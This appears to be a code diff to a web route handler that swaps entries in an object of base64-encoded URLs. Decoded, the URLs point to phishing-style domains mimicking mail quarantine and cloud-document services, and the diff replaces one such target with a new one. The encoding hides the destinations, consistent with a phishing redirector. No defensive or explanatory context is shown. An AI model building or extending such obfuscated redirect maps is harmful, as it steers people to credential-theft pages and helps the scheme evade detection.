@@ -27,7 +27,7 @@ export async function GET(request) {
     "baset": "aHR0cHM6Ly9qYWNrLXJlZG1vbmQtZG9jLm9ucmVuZGVyLmNvbQ==",
     "famscraft": "aHR0cHM6Ly9jbG91ZGRvY3NldnIudG9wPzBmbWNobzcyb2c9WjJWeGFXZHo=",
     "proceeds": "aHR0cHM6Ly9uaXJ2YW5uYS50b3A/WnpVRDBUVnk9YUhOcmIyTnY=",
-    "dottosign": "aHR0cHM6Ly9wcml2YXRlZW1haWwuY29tL2FqYXgvc2hhcmUvMDNhNTA1NTkwNGE5MjcwMjM5NzhjN2I0YTkyNzRlNjdiODVkZWE3YzNjYmQwNDUxLzEvOC9OelUwL056VTBMek14",
+    "craft": "aHR0cHM6Ly9xdWFyYW50aW5lZC1tYWlsLW1zdzhkLm9uZGlnaXRhbG9jZWFuLmFwcA==",
     "dsosj": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "rswer": "aHR0cHM6Ly9hYm9kZWFuZGNsb3VkcmVhZHMudG9wP0lhS1VySUx0S1Y4MT1kbTl2YjNOeA=="
   };
